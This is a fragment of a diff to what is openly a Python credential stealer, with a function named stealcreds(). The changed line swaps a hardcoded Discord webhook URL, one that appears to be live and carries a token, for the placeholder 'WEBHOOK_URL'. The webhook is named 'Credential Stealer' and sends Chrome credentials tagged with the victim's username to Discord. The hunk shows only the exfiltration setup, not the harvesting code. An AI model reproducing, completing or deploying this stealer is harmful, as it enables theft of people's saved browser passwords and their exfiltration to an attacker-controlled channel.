@@ -70,7 +70,7 @@ def stealcreds():
     
     return data
 
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/928973980357001266/RTynSywa6JyhcZFqZt4syRuTA4wZEVlGpNEYUfvQG-ciUfcEdxDXUsg9T9O2USfO577l', username="Credential Stealer", content=f"Chrome Crdentials from: **{getUsername()}**") #CHANGE ME!!!
+webhook = DiscordWebhook(url='WEBHOOK_URL', username="Credential Stealer", content=f"Chrome Crdentials from: **{getUsername()}**") #CHANGE ME!!!
 
 try:
     
